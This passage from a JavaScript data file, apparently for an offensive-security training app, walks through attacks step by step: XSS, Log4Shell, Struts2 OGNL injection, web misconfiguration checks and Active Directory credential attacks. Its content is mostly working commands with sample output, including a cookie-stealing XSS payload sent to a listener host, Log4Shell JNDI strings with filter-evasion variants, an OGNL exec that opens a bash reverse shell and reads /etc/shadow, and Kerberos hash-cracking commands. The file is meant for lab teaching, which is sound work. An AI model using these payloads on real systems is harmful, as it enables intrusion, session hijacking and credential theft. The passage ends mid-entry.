      how: {"lead":"XSS runs your JavaScript in another user's browser. Prove reflection, then turn it into cookie theft or an action as the victim, reflected, stored, or in the DOM:","items":[{"t":"Prove reflection","d":"Send a unique string and find it unencoded in the response. If < and > come back raw, injected markup becomes live HTML.","demo":[{"run":"curl -s 'http://<target>/search?q=<obol>'","out":"<p>No results for <obol></p>","sig":"<obol>"}],"note":"Your angle brackets came back raw, not &lt;obol&gt;, so markup you inject runs."},{"t":"Fire a proof payload","d":"alert(1) proves execution but is noisy; a harmless document.title or a request to your box is cleaner for a report. Confirm the context (body, attribute, script) to pick the break-out.","demo":[{"run":"curl -s 'http://<target>/search?q=<script>document.title=1</script>'","out":"<p>No results for <script>document.title=1</script></p>","sig":"<script>document.title=1</script>"}],"note":"The script tag is reflected intact into the body: it runs for any victim who opens this URL."},{"t":"Steal the session cookie","d":"The classic impact: exfiltrate document.cookie to a listener you control. Only cookies without HttpOnly are reachable, so check that first.","demo":[{"run":"curl -s 'http://<target>/search?q=<script>new Image().src=\"http://<lhost>/c=\"+document.cookie</script>'","out":"(on your box)  GET /c=session=ab12cd34ef HTTP/1.1","sig":"/c=session="}],"note":"The victim's browser sent their session cookie to you; replay it to ride their session."},{"t":"Prefer stored over reflected","d":"A payload saved in a comment, profile, or ticket fires for every viewer, including staff, with no link to phish. Find a field whose content other users later load.","demo":[{"run":"curl -s -X POST \"http://<target>/post/1/comment\" --data \"body=<script>document.title=1</script>\"","out":"{\"status\":\"comment saved\",\"id\":42}","sig":"comment saved"}],"note":"Saved once, it runs for every visitor to that post, which is how XSS reaches an admin."},{"t":"Beat filters and CSP","d":"Tags stripped? Try event handlers (onerror, onload) or alternate tags (<img>, <svg>). CSP blocking inline script? Look for an allowed CDN or a JSONP endpoint to load from.","demo":[{"run":"curl -s 'http://<target>/search?q=<img src=x onerror=document.title=1>'","out":"<p>No results for <img src=x onerror=document.title=1></p>","sig":"onerror=document.title=1"}],"note":"The <script> tag was stripped but <img onerror> survived the filter and still runs; pick whatever the filter missed."}]},
      leadup: [{"key":"reflected","label":"A reflected search","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Test the search box","tool":"curl","where":"local","cmd":"curl -s 'http://<target>/search?q=oboltest123'","out":"<p>No results for <b>oboltest123</b></p>","sig":"oboltest123","teach":"Your input came back verbatim in the HTML; if it is not encoded, a script payload in q= will execute in the victim's browser."}]},{"key":"stored","label":"A stored comment","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a place that saves input","tool":"curl","where":"local","cmd":"curl -s http://<target>/post/1 | grep -iE 'comment|name='","out":"<form action=\"/post/1/comment\"><textarea name=\"body\"></textarea></form>","sig":"action=\"/post/1/comment\"","teach":"A comment or profile field that other users later view is a stored-XSS surface, which hits every visitor, not just one you phish."}]}],
      why: "On a lab box XSS is rarely the goal itself; it is a way to steal an admin's session or make their browser fetch something only they can reach. So the real question is not \"does it pop an alert\" but \"is there a privileged user who will view my payload\". Reach for it when the app has an admin who reviews user content, a support ticket, a comment, a profile field. Without a victim to trigger it, stored XSS is a dead end, spend your time elsewhere.",
      cmd: "curl -s 'http://10.10.10.10/search.php?q=<b>xssprobe123</b>'", tool: 'curl',
      output: [
        '<p>No results for <b>xssprobe123</b></p>',
      ].join('\n'),
      signal: '<p>No results for <b>xssprobe123</b></p>',
      teach: 'Your <b> tag came back rendered, not escaped, the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing a session. On OSCP it matters most where it can reach an admin.',
    },
    'check-log4shell': {
      how: {"lead":"Log4Shell turns any logged string into RCE through a JNDI lookup. Stand up a catcher, fire the payload into a logged field, and confirm the connect-back before you weaponise:","items":[{"t":"Stand up a JNDI/LDAP catcher","d":"A tool like JNDIExploit hosts the second-stage payload and logs the victim's connect-back. Start it before you send anything.","demo":[{"run":"java -jar JNDIExploit.jar -i <lhost>","out":"[+] LDAP Listener on 1389\n[+] HTTP Listener on 8888\n[+] Payload: ${jndi:ldap://<lhost>:1389/Basic/Command/Base64/...}","sig":"LDAP Listener on 1389"}],"note":"The kit prints the exact ${jndi:...} string to paste into a logged field."},{"t":"Fire the payload into a logged field","d":"Spray the JNDI string into inputs the app logs: User-Agent, X-Forwarded-For, a username, a search box. Any one that reaches Log4j triggers the lookup.","demo":[{"run":"curl -s http://<target>/ -H 'User-Agent: ${jndi:ldap://<lhost>:1389/a}'","out":"(on your catcher)  Received LDAP connection from <target>","sig":"Received LDAP connection"}],"note":"A connection from the target confirms Log4Shell: the logged header reached a vulnerable Log4j."},{"t":"Catch the command output","d":"Once confirmed, the kit serves a payload that runs your command. Base64-encode the command to survive the lookup syntax, and read the result on your listener.","demo":[{"run":"curl -s http://<target>/ -H 'User-Agent: ${jndi:ldap://<lhost>:1389/Basic/Command/Base64/aWQ=}'","out":"(on your listener)  uid=0(root) gid=0(root)","sig":"uid=0(root)"}],"note":"aWQ= is base64 for id; it often runs as root, since logging daemons are privileged."},{"t":"Beat a WAF with obfuscation","d":"Filters that block ${jndi: miss the many lookup tricks: ${${lower:j}ndi:}, ${${env:X:-j}ndi}, and nested ${} forms all resolve to the same thing.","demo":[{"run":"curl -s http://<target>/ -H 'User-Agent: ${${lower:j}ndi:${lower:l}dap://<lhost>:1389/a}'","out":"(on your catcher)  Received LDAP connection from <target>","sig":"Received LDAP connection"}],"note":"The plain ${jndi: was filtered; ${lower:j}ndi resolves to the identical lookup and still reaches your catcher."}]},
      leadup: [{"key":"input","label":"A logged input","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a field that reaches the logs","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/ -H 'User-Agent: obol-probe' | grep -iE 'java|jsp|x-powered-by'","out":"X-Powered-By: Servlet/3.1 JSP/2.3 (Apache Tomcat)","sig":"JSP/2.3","teach":"A Java/JSP stack is the precondition for Log4Shell; any header or field the app logs (User-Agent, X-Forwarded-For) is a candidate sink."}]},{"key":"vulnapp","label":"A known-vulnerable app","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint the app","tool":"whatweb","where":"local","cmd":"whatweb http://<target>","out":"http://<target> [200 OK] Apache-Solr[8.3.0], Java","sig":"Apache-Solr[8.3.0]","teach":"Products like Solr, vCenter and Unifi bundled Log4j; a vulnerable version is a direct Log4Shell lead before you even hunt for a logged field."}]}],
      why: "Log4Shell is worth a quick spray on any Java app because the check is cheap and the payoff is pre-auth RCE: a vulnerable Log4j resolves a ${jndi:ldap://you/} string you place in a header or field and calls back to your server. You confirm it out-of-band by watching a listener, no callback means no bug. Reach for it when the stack is Java and the box feels dated. It is a CVE, not a design flaw, so it is a yes/no check, not an exploration.",
      signal: 'Received LDAP query from 10.10.10.10 for object /a',
      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your ${jndi:ldap://...} string and dutifully connects out to it. Stand up a listener first, then inject the string, the inbound LDAP hit confirms the callback, the first step before staging a full exploit.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 1389', output: 'Listening on 0.0.0.0 1389' },
        { where: 'local', tool: 'curl', cmd: "curl -sSkL http://10.10.10.10/ -H 'User-Agent: ${jndi:ldap://10.10.14.5:1389/a}'", output: [
          '↩ the target logged the string and connected back:',
          'Received LDAP query from 10.10.10.10 for object /a',
        ].join('\n') },
      ],
    },
    'check-struts2': {
      how: {"lead":"Struts2 evaluates an OGNL expression hidden in the Content-Type header, so one request runs a command and returns its output. Confirm in-band, then read what you need:","items":[{"t":"Fire the OGNL in Content-Type","d":"The vulnerable Jakarta parser evaluates OGNL in a malformed Content-Type. The classic payload runs a command and prints its output inline, no callback required.","demo":[{"run":"curl -s http://<target>/index.action -H \"Content-Type: %{(#rt=@java.lang.Runtime@getRuntime()).exec('id')...}\"","out":"uid=0(root) gid=0(root) groups=0(root)","sig":"uid=0(root)"}],"note":"The command output came straight back in the response: in-band, pre-auth RCE."},{"t":"Confirm with a benign command","d":"Before anything destructive, confirm with id or whoami. In-band means you see the result immediately.","demo":[{"run":"curl -s http://<target>/index.action -H \"Content-Type: %{(...exec('whoami')...)}\"","out":"root","sig":"root"}],"note":"root in the response confirms both the bug and that you are already the highest-value user."},{"t":"Read files and hashes","d":"Swap the command for cat to pull config, keys, and /etc/shadow directly, since you have execution as root.","demo":[{"run":"curl -s http://<target>/index.action -H \"Content-Type: %{(...exec('cat /etc/shadow')...)}\"","out":"root:$6$rounds=656000$...:19000:0:99999:7:::","sig":"root:$6$"}],"note":"Reading /etc/shadow as root means you can crack hashes or pivot straight to persistence."},{"t":"Drop a stable shell","d":"One-request RCE is fine for reads, but trade it for a reverse shell for anything interactive. Wrap a bash one-liner in the same OGNL exec.","demo":[{"run":"curl -s http://<target>/index.action -H \"Content-Type: %{(#rt=@java.lang.Runtime@getRuntime()).exec({'bash','-c','bash -i >& /dev/tcp/<lhost>/4444 0>&1'})}\"","out":"(on your listener)  connect to [<lhost>] from <target>\nroot@web01:/#","sig":"root@web01:/#"}],"note":"The same OGNL exec launches a bash reverse shell to your waiting listener, trading one-shot reads for an interactive root session."}]},
      leadup: [{"key":"extension","label":"A .action endpoint","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint Struts","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/login.action","out":"200","sig":"200","teach":"A live .action (or .do) URL is the Struts2 tell; the Content-Type OGNL check is worth a single request once you see one."}]},{"key":"dopage","label":"A .do action","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Try a Struts extension","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/index.do","out":"200","sig":"200","teach":"Struts maps .do as well as .action; either extension responding is reason enough to fire the one-request OGNL check."}]}],
      why: "This is a run-it-first check: once a target fingerprints as Struts2, one request either returns command output or it does not, so it costs seconds and either wins the box outright or is ruled out. Prioritise it over slower, noisier attacks the instant the stack matches, because pre-auth RCE from a single curl is as good as web exploitation gets. Its in-band nature is the gift, you are never left guessing whether it worked, which makes it a confidence-building opening play rather than a time sink.",
      cmd: 'curl -sSk http://10.10.10.10/ -H "Content-Type: %{(#cmd=\'id\')...OGNL...}"', tool: 'curl',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates an attacker expression in the Content-Type header and runs commands, here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
    },

    // ============================ SERVICE & WEB CHECKS ============================
    'check-tls-config': {
      why: "This is a free report finding, not an exploit. An expired or self-signed certificate and old protocols like SSLv3 or TLS 1.0 are low-severity but real, and nmap's ssl scripts read them without touching the app. Run it on any TLS service when you want to round out the findings section; it costs nothing and never risks the box. Do not expect a foothold from it, expect a defensible bullet point in the report.",
      cmd: 'nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.10', tool: 'nmap',
      output: [
        '| ssl-cert: Subject: commonName=dev.acme.internal',
        '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
        '|_  Not valid after:  2025-11-01T00:00:00',
        '| ssl-enum-ciphers:',
        '|_  TLSv1.0: (weak)',
      ].join('\n'),
      signal: '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
      teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames (like vault.acme.internal) you had no other way to discover. The cipher list and expiry are reporting findings too.',
    },
    'check-http-methods': {
      why: "A one-request check for a classic misconfiguration: an OPTIONS request lists which HTTP verbs the server allows, and dangerous ones (PUT, DELETE, TRACE) are reportable on their own. It also feeds verb-tampering: a permitted PUT can mean you upload a shell. Run it on any web server; it is instant and exam-safe. Treat an enabled PUT or DELETE as a lead to chase, not just a line in the report.",
      cmd: 'curl -sSIkLX OPTIONS http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
      teach: 'OPTIONS reports which verbs the server accepts. PUT or DELETE in the list is a red flag, PUT can mean you upload a web shell directly, no injection needed.',
    },
    'check-cors': {
      why: "A permissive CORS policy, reflecting any Origin you send or allowing \"null\", lets a malicious site read authenticated responses, which is a genuinely high-value web finding. One request with a spoofed Origin header settles it. Run it whenever the app has authenticated data that is reachable cross-origin. It is a report win that now and then escalates into real data theft.",
      cmd: 'curl -sSIkL -H "Origin: https://evil.example" http://10.10.10.10/api/me', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Access-Control-Allow-Origin: https://evil.example',
        'Access-Control-Allow-Credentials: true',
      ].join('\n'),
      signal: 'Access-Control-Allow-Origin: https://evil.example',
      teach: 'The server reflected your arbitrary Origin AND allows credentials, a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous pair.',
    },
    'check-http-redirect': {
      why: "Low severity, but it belongs in every report and costs exactly one request. The trick is to NOT follow redirects: you want to see whether the bare endpoint answers with real content or bounces you to TLS. If it hands over the page unencrypted, everything on it, cookies and credentials included, is sniffable in transit. Watch the Location line too, a redirect now and then leaks an internal hostname you had no other way to learn.",
      cmd: 'curl -sSIk http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 301 Moved Permanently',
        'Location: https://dev-internal.acme.internal/',
      ].join('\n'),
      signal: 'Location: https://dev-internal.acme.internal/',
      teach: 'A redirect can leak an internal hostname in its Location header, dev-internal.acme.internal is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
    },
    'check-subdomain-takeover': {
      why: "High impact for the price of a single lookup, which is why it earns a pass whenever you hold a list of subdomains. Most names resolve to something still owned and are dead ends; you are hunting the rare one that points at a decommissioned cloud app nobody re-registered. Claim that target yourself and you serve content on the victim's own trusted name. The confirm step is the whole game, a live record is nothing, only the unclaimed one is the finding.",
      cmd: 'dig +noall +answer CNAME shop.acme.internal', tool: 'dig',
      output: [
        'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
      ].join('\n'),
      signal: 'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. Confirm by visiting it and seeing an unclaimed-app page.',
    },
    'check-dns-email': {
      why: "A dependable report bullet whenever a domain is in scope, settled by two TXT lookups and nothing else. What you are judging is whether an outsider could send mail that forges this name: no SPF, or a DMARC policy of p=none, means forged mail is unlikely to be rejected. On the exam it is simply a finding; in a real engagement it is the opening for a phishing pretext. Read both records before you call it.",
      cmd: 'dig +short TXT _dmarc.acme.internal', tool: 'dig',
      output: [
        '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
      ].join('\n'),
      signal: '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
      teach: 'Email records say whether a domain can be spoofed. DMARC p=none means forged mail from this domain is unlikely to be rejected, a phishing lead in a real engagement, a reporting finding on the exam.',
    },
    'check-web-headers': {
      why: "The cheapest findings on any web app, and a lead generator on top. One HEAD request tells you which defensive headers are absent (no HSTS, no CSP, no X-Frame-Options) and what the stack gives away, a Server or X-Powered-By string naming the exact build. The absences go straight into the report; the leaked version feeds your CVE search. Do it early, before anything clever, because it shapes which clever thing is worth trying.",
      cmd: 'curl -sSIkL http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Server: Apache/2.4.49 (Unix)',
        'X-Powered-By: PHP/7.4.3',
        '# (no Content-Security-Policy, no X-Frame-Options)',
      ].join('\n'),
      signal: 'X-Powered-By: PHP/7.4.3',
      teach: 'Response headers hand you the stack for free and show what protections are missing. X-Powered-By leaks the PHP version; the absence of CSP and X-Frame-Options are reporting findings. Read the headers before anything clever.',
    },
    'check-web-components': {
      why: "Nothing can fire until you know exactly what the app is built from, so this is the step that turns \"maybe vulnerable\" into a named exploit to try. A single GET exposes the tells: script src paths, a generator meta tag, the Server string, framework-specific cookies. Together they name the components and their versions, which is precisely what the exploit catalog matches against. Run it right after triage; a sharp fingerprint saves you firing CVEs at the wrong stack.",
      cmd: 'curl -sSikL http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Server: Apache/2.4.49 (Unix)',
        'Set-Cookie: PHPSESSID=8f2...; path=/',
        '<meta name="generator" content="Joomla! 3.9">',
      ].join('\n'),
      signal: '<meta name="generator" content="Joomla! 3.9">',
      teach: 'Between the headers and the page body, the component stack is usually visible, here a generator meta tag names Joomla 3.9. A pinned CMS version maps straight to known exploits; identify it before you attack.',
    },
    'check-cms-version': {
      why: "Fingerprinting the CMS tells you what it is; pinning the exact version tells you whether its known CVEs apply, and version-gated exploits fail silently against the wrong build. This reads the files that publish the version (CHANGELOG, readme, composer.lock). Run it once you know the CMS and want to match it to an exploit. The exact version is the difference between a working CVE and a wasted hour.",
      cmd: 'curl -sSkL http://10.10.10.10/CHANGELOG.txt', tool: 'curl',
      output: [
        'Drupal 7.57, 2018-02-21',
        '----------------------',
      ].join('\n'),
      signal: 'Drupal 7.57, 2018-02-21',
      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2, CVE-2018-7600). Identify the CMS and its exact build, then look up what breaks it.',
    },
    'check-web-body': {
      why: "The header checks stop at the response headers; plenty of findings live in the markup itself. Reading the body turns up http:// resources loaded into an HTTPS page (mixed content), a login form that still allows autocomplete, a POST form with no anti-CSRF token, and, more often than you would expect, credentials and debug endpoints left in HTML comments. Individually minor, together they round out the report, and now and then the source hands you a working test/test login no scan would ever find.",
      cmd: 'curl -sSkL http://10.10.10.10/', tool: 'curl',
      output: [
        '<form action="/login.php" method="post">',
        '<!-- TODO: remove test login test/test before go-live -->',
        '</form>',
      ].join('\n'),
      signal: '<!-- TODO: remove test login test/test before go-live -->',
      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A test/test login left in a comment is a free set of working credentials, read the page humans never read.',
    },
    'check-exposed-files': {
      why: "Few checks pay off as wildly out of proportion to the effort: seconds of read-only requests against well-known paths, and a single hit can hand you database and API keys outright. You are probing for things that were never meant to face the web, a .env, a .git directory you can dump back to source, a server-status board, an editor's leftover .bak. Run it on every app before anything fancier; the one that leaks its .env turns a long engagement into a short one.",
      cmd: 'curl -sSkL http://10.10.10.10/.env', tool: 'curl',
      output: [
        'APP_ENV=production',
        'DB_HOST=127.0.0.1',
        'DB_PASSWORD=sup3rs3cret',
      ].join('\n'),
      signal: 'DB_PASSWORD=sup3rs3cret',
      teach: 'Framework apps keep secrets in a .env file that should never be web-reachable. When it is, it leaks database and API credentials outright. Always probe for .env, .git/HEAD, and server-status before anything else.',
    },

    // ============================ ACTIVE DIRECTORY ============================
    'ad-dc-identify': {
      why: "Nothing in the AD playbook works until you know the domain name and which host is the DC, so this is the mandatory first step the moment a scan shows the AD fingerprint (88, 389, 445 together). It names the domain and finds the DC, and those two facts feed every later command, impacket, nxc, and kerbrute all need the domain and the DC IP. Getting the domain FQDN exactly right matters, Kerberos is picky, and a wrong domain name is behind half the \"impacket is broken\" complaints.",
      cmd: "nxc ldap 10.10.10.10 -u '' -p ''", tool: 'nxc',
      output: [
        'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
        'LDAP  10.10.10.10  389  DC01  [+] Anonymous bind to LDAP succeeded',
        'LDAP  10.10.10.10  389  DC01  [*] Base DN: DC=acme,DC=internal',
      ].join('\n'),
      signal: 'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
      teach: 'nxc against LDAP names the host (DC01) and the domain (acme.internal) and gives the base DN, the three facts every later AD command needs. Kerberos (88) + LDAP (389) + SMB (445) on one host is the fingerprint of a Domain Controller.',
    },
    'ad-anon-ldap-enum': {
      why: "The single highest-payoff thing you can try against a DC before you hold any credential, so run it the instant you have identified one. If the bind is allowed it spills the base DN and often the full user and group list, and description fields are where admins park a password \"just for now\". A list pulled from here is the raw feedstock for roasting and spraying, so an open bind can bootstrap your entire domain attack from nothing.",
      cmd: "nxc ldap 10.10.10.10 -u '' -p '' --users", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [*] Enumerated domain users',
        'LDAP  10.10.10.10  389  DC01  Administrator',
        'LDAP  10.10.10.10  389  DC01  tgibson',
        'LDAP  10.10.10.10  389  DC01  jbloggs',
        'LDAP  10.10.10.10  389  DC01  svc_sql',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  tgibson',
      teach: 'If anonymous LDAP bind is allowed, you can list every domain user with no credentials at all. That user list is the raw material for AS-REP roasting and password spraying, the two no-creds ways into the domain.',
    },
    'ad-user-enum': {
      why: "When an anonymous bind gave you nothing, this is how you still build a user list with zero credentials. The KDC leaks validity for free, answering differently for a real name than a fake one, so kerbrute confirms accounts without a single login attempt, and a null SMB session sometimes lists them over RPC as a bonus. You cannot spray or roast users you have not confirmed exist, so a verified list is the prerequisite for most of what follows.",
      cmd: 'kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt', tool: 'kerbrute',
      output: [
        '2026/09/17 10:41:02 >  Using KDC(s): 10.10.10.10:88',
        '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
        '2026/09/17 10:41:03 >  [+] VALID USERNAME: jbloggs@acme.internal',
        '2026/09/17 10:41:05 >  Done! Tested 48 usernames (2 valid) in 2.8s',
      ].join('\n'),
      signal: '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
      teach: 'kerbrute asks the KDC (port 88) whether each username exists, valid names get a different Kerberos error than bad ones, and it never submits a password, so it does not lock accounts. A confirmed list feeds roasting and spraying.',
    },
    'asrep-roast': {
      why: "This is the credential-free attack everyone tries first in AD, because it needs only a username list: any account flagged DONT_REQUIRE_PREAUTH will hand out an AS-REP whose encrypted part is the user's password hash, with no login required. Reach for it the moment you have usernames. It is pure upside, you lose nothing by asking, and a single pre-auth-disabled account with a weak password can be your entire way in.",
      cmd: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] tgibson has UF_DONT_REQUIRE_PREAUTH set',
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
      ].join('\n'),
      signal: '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
      teach: 'An account with pre-auth disabled (UF_DONT_REQUIRE_PREAUTH) hands out an AS-REP encrypted with its password hash to anyone who asks, no credentials needed. Capture that $krb5asrep$ hash and crack it offline.',
    },
    'crack-asrep': {
      why: "The payoff step that turns a roasted hash into an actual login, run it the moment AS-REP roasting hands you a $krb5asrep$ blob. It cracks entirely on your box with hashcat mode 18200, so there is zero further contact with the DC. These are usually accounts set to skip pre-auth and then given a weak password, so rockyou lands often; when it does not, the password is strong and you move on rather than grind. A hit is a validated domain credential, usually your first real foothold.",
      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b:Autumn2026!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'The AS-REP hash (mode 18200) is encrypted with the user\'s password, so it cracks offline at full GPU speed with no lockout. "Cracked" means you now hold tgibson\'s real password, a foothold credential in the domain.',
    },
    'gpp-passwords': {
      why: "Still worth checking every single time you have any domain read access, because the cost is one SYSVOL read and the prize is a working local-admin password. The cpassword blob in those old Groups.xml files is AES-encrypted with a key Microsoft published in 2012, so gpp-decrypt reverses it instantly. The recovered password tends to reuse across a whole fleet of machines, which is exactly why a flaw this old still turns up boxes.",
      cmd: "smbclient '//10.10.10.10/SYSVOL' -N -c 'recurse; ls'", tool: 'smbclient',
      output: [
        '\\acme.internal\\Policies\\{31B2F340-...}\\MACHINE\\Preferences\\Groups\\Groups.xml',
        '  userName="svc_admin"',
        '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
      ].join('\n'),
      signal: '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
      teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read Groups.xml and decrypt the cpassword with gpp-decrypt, a free set of working credentials.',
    },
    'smb-share-inventory': {
      why: "A readable SMB share is where admins leave what they should not: configs, backups, scripts, password files. So once you have any credential (or an anonymous session), recursively inventory every readable share, because the win is often just sitting in one. Reach for it early in the domain. It is unglamorous but high-yield, more boxes fall to a password in a share than to any clever Kerberos attack.",
      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\jbloggs:Autumn2026!',
        'SPIDER_PLUS  Finance\\Payroll\\Q4-2023-summary.xlsx (18 KB)',
        'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
      ].join('\n'),
      signal: 'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
      teach: 'With any valid credential, spider_plus walks every readable share and lists interesting files. Scripts, spreadsheets, and configs on file shares routinely contain the next credential, loot the shares before you do anything loud.',
    },
    'kerberoast': {
      why: "The standard opening move the moment you hold any domain credential, because every SPN-bearing account will hand you a crackable ticket just for asking. The reason it pays is sociological, not technical: service-account passwords are human-set, rarely rotated, and the accounts are often over-privileged, so one crack can jump you a long way up. Request them all at once, crack offline, and treat any that break as credentials to reuse everywhere.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] Found SPN: MSSQLSvc/db01.acme.internal (svc_sql)',
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
      ].join('\n'),
      signal: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
      teach: 'Any authenticated user can request a service ticket for an account that has an SPN. That ticket is encrypted with the service account\'s password hash, so you crack it offline. Service accounts often have weak, rarely-rotated passwords.',
    },
    'crack-tgs': {
      why: "The $krb5tgs$ ticket you roasted cracks offline to the service account's plaintext. Reach for it right after kerberoasting. Service accounts often carry weak, never-expiring passwords and elevated rights, so a crack here is frequently a big step up, sometimes straight to Domain Admin if the account is over-privileged. If rockyou does not break it, the password is strong, so note it and look elsewhere rather than grinding.",
      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...:P@ssw0rd2023',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoasted service ticket (mode 13100) cracks offline, the DC never sees your guesses, so there is no lockout. "Cracked" means you now hold svc_sql\'s cleartext password, often a path to a database or a privileged service.',
    },
    'password-spray': {
